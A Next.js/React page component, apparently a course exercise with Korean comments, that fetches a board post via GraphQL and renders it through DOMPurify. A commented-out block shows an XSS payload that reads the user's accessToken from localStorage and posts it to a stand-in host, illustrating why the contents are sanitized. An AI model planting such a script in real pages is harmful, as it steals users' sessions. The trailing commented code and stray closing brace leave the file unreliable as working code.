import { useQuery, gql } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutingMovedPage(): JSX.Element {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.qqq },
  });

  return (
    <div>
      {/* <div>{router.query.qqq}번 게시글 이동이 완료되었습니다.</div> */}
      <div style={{ color: "red" }}>작성자: {data?.fetchBoard?.writer}</div>
      <div style={{ color: "green" }}>제목: {data?.fetchBoard?.title}</div>
      {/* <div>내용: {data?.fetchBoard?.contents}</div> */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: `
              <script>
                const qqq = localStorage.getItem("accessToken")
                axios.post("http://mybackerbackend.com/mydata", {data: qqq})
              </script>
          `,
        }}
      /> */}
      {typeof window !== "undefined" ? (
        <div
          style={{ color: "blue" }}
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard?.contents),
          }}
        />
      ) : (
        <div style={{ color: "blue" }}>
          <div style={{ color: "brown" }}>주소: 구로구</div>
        </div>
      )}
    </div>
  );
}


  /* //  이거는 오류 생길거임 왜? 프리렌더링할떄 효과를 극대화하기 위해서 자체적으로
// {typeof window !== "undefined" && ( */


  /* //   <div */


  /* //     style={{ color: "blue" }}
//     dangerouslySetInnerHTML={{
//       __html: Dompurify.sanitize(data?.fetchBoard?.contents),
//     }}
//   />
// )}
// <div style={{ color: "brown" }}>주소: 구로구</div>
// </div>
// );
// } */
}
